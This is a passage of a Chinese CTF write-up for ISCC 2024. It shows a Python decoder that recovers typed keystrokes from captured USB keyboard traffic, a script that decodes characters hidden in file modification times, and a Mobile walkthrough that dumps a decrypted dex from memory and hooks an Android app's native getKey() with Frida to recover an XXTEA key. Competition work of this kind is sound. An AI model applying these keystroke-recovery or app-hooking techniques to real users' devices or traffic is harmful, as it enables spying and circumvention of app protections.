class="hljs-comment">#!/usr/bin/env python  </span><br>\<span class="hljs-comment"># -\*- coding:utf-8 -\*-\\  </span><br><span class="hljs-keyword">import</span> re  <br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;\&lt;RET\&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;\&lt;ESC\&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;\&lt;DEL\&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;\&lt;SPACE\&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;\&lt;NON\&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;\&lt;GA\&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;\&lt;CAP\&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;\&lt;F1\&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;\&lt;F2\&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;\&lt;F3\&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;\&lt;F4\&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;\&lt;F5\&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;\&lt;F6\&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;\&lt;F7\&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;\&lt;F8\&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;\&lt;F9\&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;\&lt;F10\&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;\&lt;F11\&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;\&lt;F12\&gt;&quot;</span>&#125;  <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;\#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;\$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;\^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;\*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;\&lt;RET\&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;\&lt;ESC\&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;\&lt;DEL\&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;\&lt;SPACE\&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;\&lt;NON\&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">34</span><span class="hljs-string">&quot;:&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">35</span><span class="hljs-string">&quot;:&quot;</span>\&lt;GA\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">36</span><span class="hljs-string">&quot;:&quot;</span>\&lt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">37</span><span class="hljs-string">&quot;:&quot;</span>\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">38</span><span class="hljs-string">&quot;:&quot;</span>?<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">39</span><span class="hljs-string">&quot;:&quot;</span>\&lt;CAP\&gt;<span class="hljs-string">&quot;,&quot;</span>3a<span class="hljs-string">&quot;:&quot;</span>\&lt;F1\&gt;<span class="hljs-string">&quot;,&quot;</span>3<span class="hljs-string">b&quot;:&quot;</span>\&lt;F2\&gt;<span class="hljs-string">&quot;, &quot;</span>3c<span class="hljs-string">&quot;:&quot;</span>\&lt;F3\&gt;<span class="hljs-string">&quot;,&quot;</span>3d<span class="hljs-string">&quot;:&quot;</span>\&lt;F4\&gt;<span class="hljs-string">&quot;,&quot;</span>3e<span class="hljs-string">&quot;:&quot;</span>\&lt;F5\&gt;<span class="hljs-string">&quot;,&quot;</span>3<span class="hljs-string">f&quot;:&quot;</span>\&lt;F6\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">40</span><span class="hljs-string">&quot;:&quot;</span>\&lt;F7\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">41</span><span class="hljs-string">&quot;:&quot;</span>\&lt;F8\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">42</span><span class="hljs-string">&quot;:&quot;</span>\&lt;F9\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">43</span><span class="hljs-string">&quot;:&quot;</span>\&lt;F10\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">44</span><span class="hljs-string">&quot;:&quot;</span>\&lt;F11\&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-number">45</span><span class="hljs-string">&quot;:&quot;</span>\&lt;F12\&gt;<span class="hljs-string">&quot;&#125;  </span><br><span class="hljs-string">output = []  </span><br><span class="hljs-string">keys = open(&#x27;test.json&#x27;)  </span><br><span class="hljs-string">keys=re.findall(r&#x27;usb\\.capdata&quot;</span>: <span class="hljs-string">&quot;([\^\\&quot;</span>]+)<span class="hljs-string">&#x27;,keys.read())  </span><br><span class="hljs-string">print(keys)  </span><br><span class="hljs-string">for line in keys:  </span><br><span class="hljs-string"> try:  </span><br><span class="hljs-string"> if line[0]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or (line[1]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and line[1]!=&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;) or line[3]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[4]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[9]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[10]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[12]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[13]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[15]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[16]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[18]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[19]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[21]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[22]!=&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; or line[6:8]==&quot;00&quot;:  </span><br><span class="hljs-string"> continue  </span><br><span class="hljs-string"> if line[6:8] in normalKeys.keys():  </span><br><span class="hljs-string"> output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;]  </span><br><span class="hljs-string"> else:  </span><br><span class="hljs-string"> output += [&#x27;</span>[unknown]<span class="hljs-string">&#x27;]  </span><br><span class="hljs-string"> except:  </span><br><span class="hljs-string"> pass  </span><br><span class="hljs-string">\# keys.close()  </span><br><span class="hljs-string"></span><br><span class="hljs-string">flag=0  </span><br><span class="hljs-string">print(&quot;&quot;.join(output))  </span><br><span class="hljs-string">for i in range(len(output)):  </span><br><span class="hljs-string"> try:  </span><br><span class="hljs-string"> a=output.index(&#x27;</span>\&lt;DEL\&gt;<span class="hljs-string">&#x27;)  </span><br><span class="hljs-string"> del output[a]  </span><br><span class="hljs-string"> del output[a-1]  </span><br><span class="hljs-string"> except:  </span><br><span class="hljs-string"> pass  </span><br><span class="hljs-string">for i in range(len(output)):  </span><br><span class="hljs-string"> try:  </span><br><span class="hljs-string"> if output[i]==&quot;\&lt;CAP\&gt;&quot;:  </span><br><span class="hljs-string"> flag+=1  </span><br><span class="hljs-string"> output.pop(i)  </span><br><span class="hljs-string"> if flag==2:  </span><br><span class="hljs-string"> flag=0  </span><br><span class="hljs-string"> if flag!=0:  </span><br><span class="hljs-string"> output[i]=output[i].upper()  </span><br><span class="hljs-string"> except:  </span><br><span class="hljs-string"> pass  </span><br><span class="hljs-string">print (&#x27;</span>output :<span class="hljs-string">&#x27; + &quot;&quot;.join(output))</span><br></code></pre></td></tr></table></figure>

<p>Exp2</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> time  <br><span class="hljs-keyword">import</span> os  <br><br>t=<span class="hljs-number">1728864000</span>  <br>b=<span class="hljs-string">&quot;&quot;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">18</span>):  <br> mtime = time.localtime(os.path.getmtime(<span class="hljs-string">&quot;./34/.%s.txt&quot;</span>%i))  <br> mtime=<span class="hljs-built_in">int</span>(time.mktime(time.strptime(time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, mtime), <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)))  <br> b+=<span class="hljs-built_in">chr</span>(mtime-t)  <br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure>

<h3 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h3><h4 id="Mobile-ChallengeMobile"><a href="#Mobile-ChallengeMobile" class="headerlink" title="Mobile ChallengeMobile"></a>Mobile ChallengeMobile</h4><p><img src="../../../../img/archives/2024ISCC05/f3f87b884e26ede8084b659bc42f7d2d.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/7c252c5c18d57ddae00df0265bb8774b.png" srcset="/img/loading.gif" lazyload> 安装 apk，打开进行尝试，反编译后对报错提示进行查找</p>
<p><img src="../../../../img/archives/2024ISCC05/83446fc064c3dc4ec614e08ac2c71e3a.png" srcset="/img/loading.gif" lazyload> 反编译后发现在 check 类中，并继承了点击监听，则判断当点击 check 按钮时执行该类，调用 Jformat 进行判断</p>
<p>Jformat 中又调用了 LoadData 把 assets 文件夹下的 ming 转 Byte 再传到 native 里进行解密，再将返回的 byte 组成 dex 文件存到 com.example.challengemobile.Checker</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br><span class="hljs-built_in">public</span> <span class="hljs-type">boolean</span> Jformat(String str) &#123;<br>    try &#123;<br>        <span class="hljs-keyword">Class</span> loadClass = (Build.<span class="hljs-keyword">VERSION</span>.SDK_INT &gt;= <span class="hljs-number">29</span> ? <span class="hljs-built_in">new</span> InMemoryDexClassLoader(<span class="hljs-built_in">new</span> ByteBuffer[]&#123;ByteBuffer.wrap(a(LoadData(&quot;ming&quot;)))&#125;, <span class="hljs-built_in">new</span> File(((PathClassLoader) getClassLoader()).findLibrary(&quot;challengemobile&quot;)).getParent(), getClassLoader().getParent()) : <span class="hljs-keyword">null</span>).loadClass(&quot;com.example.challengemobile.Checker&quot;);<br>        <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span> = loadClass.getMethod(&quot;isflag&quot;, String.<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">if</span> (str.substring(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>).equals(&quot;ISCC&#123;&quot;) &amp;&amp; str.charAt(str.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>            try &#123;<br>                String substring = str.substring(<span class="hljs-number">5</span>);<br>                <span class="hljs-type">Boolean</span> <span class="hljs-type">bool</span> = (<span class="hljs-type">Boolean</span>) <span class="hljs-keyword">method</span>.invoke(loadClass.newInstance(), substring.substring(<span class="hljs-number">0</span>, substring.length() - <span class="hljs-number">1</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-type">bool</span> != <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-type">bool</span>.booleanValue()) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125; catch (IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;<br>                throw <span class="hljs-built_in">new</span> RuntimeException(e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125; catch (ClassNotFoundException | NoSuchMethodException e2) &#123;<br>        throw <span class="hljs-built_in">new</span> RuntimeException(e2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>于是使用 GG 修改器抓取这段加密逻辑，选择监听进程后，选择抓取 java 内存，点击 check，再精确查找 dex 的文件头 h64 65 78 0A 30 33</p>
<p>搜索完成后，导出此地址的内存，并对 <img src="../../../../img/archives/2024ISCC05/5bc693a2301301ac71523b44cefa559d.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/c782d0711f1c674b32d4626d060c175f.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/5271ec5c5cfbcc7278ed67f38bebf1e0.png" srcset="/img/loading.gif" lazyload> dex 进行反编译分析</p>
<p>反编译后发现 DEL <img src="../../../../img/archives/2024ISCC05/2d777e87979959ef3e1d8d0815fa6d20.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/19be198e9d58c716f57ffa0f34ca9e69.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/3ae6a6210ae02d3127826d95fbbc2363.png" srcset="/img/loading.gif" lazyload> TA，native getKey()，和密文，并根据加密逻辑判断出是 XXTEA 加密算法</p>
<p><img src="../../../../img/archives/2024ISCC05/7805224f9d0e592ade865fd536616060.png" srcset="/img/loading.gif" lazyload> 编写 exp 对 native getKey()进行 hook</p>
<p><img src="../../../../img/archives/2024ISCC05/0f32285be839468d17ba4349dc83adaa.png" srcset="/img/loading.gif" lazyload> 得到 key，进行 XXTEA 解密得到 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida,sys  <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message</span>):  <br> <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:  <br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[\*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))  <br> <span class="hljs-keyword">else</span>:  <br> <span class="hljs-built_in">print</span>(message)  <br><br><br>js_code = <span class="hljs-string">&#x27;&#x27;&#x27;  </span><br><span class="hljs-string">function main() &#123;  </span><br><span class="hljs-string"> Java.perform(function () &#123;  </span><br><span class="hljs-string"> var ClassUse = Java.use(&quot;java.lang.Class&quot;);  </span><br><span class="hljs-string"> var dexclassLoader = Java.use(&quot;dalvik.system.DexClassLoader&quot;);  </span><br><span class="hljs-string"></span><br><span class="hljs-string"> console.log(ClassUse);  </span><br><span class="hljs-string"> console.log(dexclassLoader);  </span><br><span class="hljs-string"> dexclassLoader.loadClass.overload(&quot;java.lang.String&quot;).implementation = function (name) &#123;  </span><br><span class="hljs-string"> var hookname = &quot;com.example.challengemobile.Checker&quot;;  </span><br><span class="hljs-string"> var result = this.loadClass(name, false);  </span><br><span class="hljs-string"></span><br><span class="hljs-string"> if (name == hookname) &#123;  </span><br><span class="hljs-string"> var hookClass = result;  </span><br><span class="hljs-string"> var hookClassCast = Java.cast(hookClass, ClassUse);  </span><br><span class="hljs-string"> var method = hookClassCast.getMethod(&quot;getKey&quot;, []);  </span><br><span class="hljs-string"> var result = method.invoke(null, []);  </span><br><span class="hljs-string"> console.log(&quot;result&quot;, result);  </span><br><span class="hljs-string"> return result;  </span><br><span class="hljs-string"> &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">return result;  </span><br><span class="hljs-string"> &#125;;  </span><br><span class="hljs-string"> &#125;);  </span><br><span class="hljs-string">&#125;  </span><br><span class="hljs-string"></span><br><span class="hljs-string">setImmediate(main);  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>  <br><br>session = frida.get_remote_device().attach(<span class="hljs-string">&quot;challengemobile&quot;</span>)  <br>script = session.create_script(js_code)  <br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)  <br>script.load()  <br>sys.stdin.read()<br></code></pre></td></tr></table></figure>

<h4 id="Mobile-ohHELP"><a href="#Mobile-ohHELP" class="headerlink" title="Mobile ohHELP"></a>Mobile ohHELP</h4><p>Jadx 进行反编译</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 